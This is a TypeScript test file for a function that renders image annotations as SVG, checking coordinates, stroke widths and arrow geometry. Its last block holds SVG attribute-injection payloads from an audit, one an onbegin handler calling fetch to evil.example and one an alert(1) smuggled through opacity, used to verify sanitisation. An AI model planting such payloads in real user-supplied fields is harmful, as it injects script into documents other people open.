// SPDX-FileCopyrightText: 2026 Yvig Bidon
// SPDX-License-Identifier: AGPL-3.0-or-later

import { describe, it, expect } from 'vitest';
import { annotationToSvg, parseShapes, type AnnotationShape } from './annotationSvg';

/**
 * Annotations are stored in relative coordinates so they follow the display size.
 * The rendering must place them exactly where the artist drew them: an offset marker points
 * at the wrong spot of the image, which is worse than no marker.
 */
describe('parseShapes', () => {
  it('accepts both storage shapes', () => {
    expect(parseShapes([{ type: 'rect' }])).toHaveLength(1);
    expect(parseShapes({ shapes: [{ type: 'rect' }, { type: 'arrow' }] })).toHaveLength(2);
  });

  it('discards anything that is not a shape', () => {
    expect(parseShapes(null)).toEqual([]);
    expect(parseShapes('cassé')).toEqual([]);
    expect(parseShapes([null, { pas: 'un type' }])).toEqual([]);
  });
});

describe('annotationToSvg', () => {
  it('places a rectangle relative to the media dimensions', () => {
    const svg = annotationToSvg([{ type: 'rect', x: 0.5, y: 0.25, w: 0.25, h: 0.5 }], 1920, 1080);
    expect(svg).toContain('x="960"');
    expect(svg).toContain('y="270"');
    expect(svg).toContain('width="480"');
    expect(svg).toContain('height="540"');
  });

  it('draws a free path point by point', () => {
    const svg = annotationToSvg(
      [
        {
          type: 'path',
          pts: [
            [0, 0],
            [0.5, 0.5],
            [1, 1],
          ],
        },
      ],
      1000,
      500,
    );
    expect(svg).toContain('M 0,0 L 500,250 L 1000,500');
  });

  it('draws the arrow head instead of leaving it to the converter', () => {
    // An SVG marker loses its colour, and often its head, during conversion.
    const svg = annotationToSvg([{ type: 'arrow', x1: 0, y1: 0, x2: 1, y2: 0 }], 800, 600);
    expect(svg).toContain('<line');
    expect(svg).toContain('<polygon');
  });

  it('produces a document with the requested dimensions', () => {
    const svg = annotationToSvg([{ type: 'ellipse', cx: 0.5, cy: 0.5, rx: 0.1, ry: 0.1 }], 640, 360);
    expect(svg).toContain('width="640"');
    expect(svg).toContain('viewBox="0 0 640 360"');
  });

  it('composes nothing when there is nothing to show', () => {
    expect(annotationToSvg([], 1920, 1080)).toBeNull();
    expect(annotationToSvg(null, 1920, 1080)).toBeNull();
    expect(annotationToSvg([{ type: 'path', pts: [[0, 0]] }], 100, 100)).toBeNull();
  });

  it('escapes text so the document stays valid', () => {
    const svg = annotationToSvg([{ type: 'text', x: 0.1, y: 0.1, text: 'a < b & "c"' }], 100, 100);
    expect(svg).toContain('a &lt; b &amp; &quot;c&quot;');
    expect(svg).not.toContain('a < b &');
  });
});

/**
 * Stroke width is the only shape field that is NOT normalised: the viewer stores it in screen
 * pixels (`vector-effect: non-scaling-stroke`). Reading it as a fraction of the width gave a
 * 2217 px stroke on a 739 px image: the whole frame covered by a flat colour, and a ShotGrid note
 * where only the "colour" was visible. These tests pin the unit, otherwise the confusion can return.
 */
describe('annotationToSvg — stroke width in screen pixels', () => {
  const strokeOf = (svg: string | null): number =>
    Number(/stroke-width="([\d.]+)"/.exec(svg ?? '')?.[1] ?? NaN);

  const trait = (width: number | undefined, w: number, h: number) =>
    annotationToSvg(
      [
        {
          type: 'path',
          width,
          pts: [
            [0, 0],
            [1, 1],
          ],
        },
      ],
      w,
      h,
    );

  it('stays a stroke, never a flat fill', () => {
    // The exact reported case: brush at 3, image of 739 × 686.
    const sw = strokeOf(trait(3, 739, 686));
    expect(sw).toBeLessThan(739 * 0.01);
    expect(sw).toBeGreaterThan(0);
  });

  it('scales with the image, keeping the fineness it had on screen', () => {
    const petit = strokeOf(trait(3, 640, 360));
    const grand = strokeOf(trait(3, 3840, 2160));
    expect(grand).toBeGreaterThan(petit);
    expect(grand / petit).toBeCloseTo(6, 1);
  });

  it('gets thicker when the artist picked a wider brush', () => {
    expect(strokeOf(trait(12, 1280, 720))).toBeCloseTo(4 * strokeOf(trait(3, 1280, 720)), 5);
  });

  it('gives the nominal width at the reference width', () => {
    expect(strokeOf(trait(3, 1280, 720))).toBeCloseTo(3, 5);
  });

  it('stays visible on a thumbnail', () => {
    expect(strokeOf(trait(1, 160, 90))).toBeGreaterThanOrEqual(1);
  });

  it('takes the viewer width when the shape carries none', () => {
    expect(strokeOf(trait(undefined, 1280, 720))).toBeCloseTo(3, 5);
  });
});

describe('annotationToSvg — geometry derived from the stroke width', () => {
  it('gives the text the size the viewer gives it', () => {
    // Same formula as `textFontSize` on the front end: 0.02 + width × 0.005, as a fraction of the
    // HEIGHT. On 1000 px height with a brush of 4: 40 + 20 = 40 px.
    const svg = annotationToSvg([{ type: 'text', x: 0.1, y: 0.1, width: 4, text: 'a' }], 1000, 1000);
    expect(svg).toContain('font-size="40"');
  });

  it('does not let the head devour a short arrow', () => {
    // 20 px stroke: the head is capped at 45 % of its length, not at 3.5 × the stroke width.
    const svg = annotationToSvg(
      [{ type: 'arrow', x1: 0.5, y1: 0.5, x2: 0.52, y2: 0.5, width: 12 }],
      1000,
      1000,
    );
    const pointe = /points="([^"]+)"/.exec(svg ?? '')?.[1] ?? '';
    const xs = pointe.split(' ').map((p) => Number(p.split(',')[0]));
    expect(Math.max(...xs) - Math.min(...xs)).toBeLessThanOrEqual(20 * 0.45 + 0.001);
  });

  it('ignores an arrow with no length rather than dividing by zero', () => {
    expect(annotationToSvg([{ type: 'arrow', x1: 0.5, y1: 0.5, x2: 0.5, y2: 0.5 }], 800, 600)).toBeNull();
  });
});

/**
 * Shape values come from a comment JSON that any project member can write. Interpolated as-is,
 * they closed their attribute: the SVG then goes into the printable notes sheet AND to ShotGrid,
 * two documents the production opens. A numeric value is therefore validated as a number, and the
 * colour as a closed enumeration, not as escaped text.
 */
describe('annotationToSvg — no unconstrained value inside an attribute', () => {
  // Payload from the 2026-09-16 audit: the colour closes `stroke`, opens an `<animate>` and attaches
  // an event handler preceded by a solidus.
  const PAYLOAD = '#fff"/><animate attributeName="x"/onbegin="fetch(\'https://evil.example\')';

  it('does not let a colour close its attribute', () => {
    const svg = annotationToSvg([{ type: 'rect', x: 0, y: 0, w: 0.1, h: 0.1, color: PAYLOAD }], 160, 90);
    expect(svg).not.toContain('onbegin');
    expect(svg).not.toContain('<animate');
    expect(svg).toContain('stroke="#FF3B30"');
  });

  it('also discards a colour that is only a CSS function or a word', () => {
    for (const color of ['url(#x)', 'red', 'rgb(1,2,3)', '#12345', '#ff' as string]) {
      expect(annotationToSvg([{ type: 'rect', w: 0.1, h: 0.1, color }], 100, 100)).toContain(
        'stroke="#FF3B30"',
      );
    }
  });

  it('keeps the hexadecimal notations the viewer produces', () => {
    for (const color of ['#ef4444', '#FFF', '#ff3b30aa', '#abcd']) {
      expect(annotationToSvg([{ type: 'rect', w: 0.1, h: 0.1, color }], 100, 100)).toContain(
        `stroke="${color}"`,
      );
    }
  });

  it('does not let the opacity close its attribute either', () => {
    const alpha = '1"/onbegin="alert(1)' as unknown as number;
    const svg = annotationToSvg([{ type: 'rect', w: 0.1, h: 0.1, alpha }], 160, 90);
    expect(svg).not.toContain('onbegin');
    expect(svg).toContain('opacity="1"');
  });

  it('clamps the opacity to the range an attribute accepts', () => {
    expect(annotationToSvg([{ type: 'rect', w: 0.1, h: 0.1, alpha: 5 }], 100, 100)).toContain('opacity="1"');
    expect(annotationToSvg([{ type: 'rect', w: 0.1, h: 0.1, alpha: -3 }], 100, 100)).toContain('opacity="0"');
  });

  it('never writes NaN, whatever the value received', () => {
    const sale = {
      type: 'rect',
      x: 'abc',
      y: {},
      w: [],
      h: null,
      width: 'grosse',
      alpha: 'opaque',
    } as unknown as AnnotationShape;
    const svg = annotationToSvg(
      [sale, { type: 'ellipse', cx: NaN, cy: Infinity, rx: 0.2, ry: 0.2 }],
      200,
      100,
    );
    expect(svg).not.toContain('NaN');
    expect(svg).not.toContain('Infinity');
  });

  it('survives points that are not pairs', () => {
    const pts = [3, null, { x: 1 }, [0.1, 0.2], [0.3, 0.4]] as unknown as number[][];
    const svg = annotationToSvg([{ type: 'path', pts }], 100, 100);
    expect(svg).toContain('M 10,20 L 30,40');
  });

  it('ignores a text that is not a string instead of failing the export', () => {
    const shape = { type: 'text', x: 0.1, y: 0.1, text: 42 } as unknown as AnnotationShape;
    expect(() => annotationToSvg([shape], 100, 100)).not.toThrow();
    expect(annotationToSvg([shape], 100, 100)).toContain('</text>');
  });

  it('also escapes the single quote of a text', () => {
    const svg = annotationToSvg([{ type: 'text', x: 0.1, y: 0.1, text: "l'œil" }], 100, 100);
    expect(svg).toContain('&#39;');
  });

  it('clamps the document dimensions rather than writing an unreadable viewBox', () => {
    const svg = annotationToSvg([{ type: 'rect', w: 0.5, h: 0.5 }], NaN, -12);
    expect(svg).toContain('viewBox="0 0 1 1"');
  });
});
